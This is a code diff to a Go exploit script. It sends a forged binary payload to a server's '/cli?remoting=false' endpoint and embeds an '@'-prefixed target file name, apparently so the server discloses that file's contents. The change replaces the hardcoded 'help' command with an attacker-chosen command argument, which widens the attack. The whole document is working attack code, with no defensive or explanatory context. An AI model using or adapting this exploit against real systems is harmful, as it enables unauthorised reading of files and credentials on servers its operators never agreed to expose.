@@ -20,7 +20,8 @@ func init() {
 
 func main() {
 	rootUrl := os.Args[1]
-	targetFile := os.Args[2]
+	command := os.Args[2]
+	targetFile := os.Args[3]
 	sessionId := uuid.New().String()
 	doneChan := make(chan bool)
 	log.Println("Starting download request")
@@ -29,18 +30,18 @@ func main() {
 	}
 	log.Println("Download request pending")
 	log.Println("Sending forged command")
-	if err := requestFile(rootUrl, targetFile, sessionId); err != nil {
+	if err := requestFile(rootUrl, command, targetFile, sessionId); err != nil {
 		panic(err)
 	}
 	<-doneChan
 }
 
-func requestFile(rootUrl string, targetFile string, sessionId string) error {
+func requestFile(rootUrl string, command string, targetFile string, sessionId string) error {
 	targetFile = "@" + targetFile
 	targetFileNameLength := len(targetFile)
-	payload := "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00" + string(byte(targetFileNameLength+2)) + "\x00\x00" + string(byte(targetFileNameLength)) + targetFile + string([]byte{0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x03, 0x6e, 0x6f, 0x74, 0x00, 0x00, 0x00, 0x07, 0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x00, 0x00, 0x00, 0x07, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53, 0x00, 0x00, 0x00, 0x00, 0x03})
+	commandLength := len(command)
+	payload := "\x00\x00\x00" + string(byte(commandLength+2)) + "\x00\x00" + string(byte(commandLength)) + command + "\x00\x00\x00" + string(byte(targetFileNameLength+2)) + "\x00\x00" + string(byte(targetFileNameLength)) + targetFile + string([]byte{0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x03, 0x6e, 0x6f, 0x74, 0x00, 0x00, 0x00, 0x07, 0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x00, 0x00, 0x00, 0x07, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53, 0x00, 0x00, 0x00, 0x00, 0x03})
 	fmt.Println(hex.Dump([]byte(payload)))
-	log.Println(len(payload))
 	req, err := http.NewRequest(http.MethodPost, rootUrl+"/cli?remoting=false", bytes.NewBufferString(payload))
 	if err != nil {
 		return err
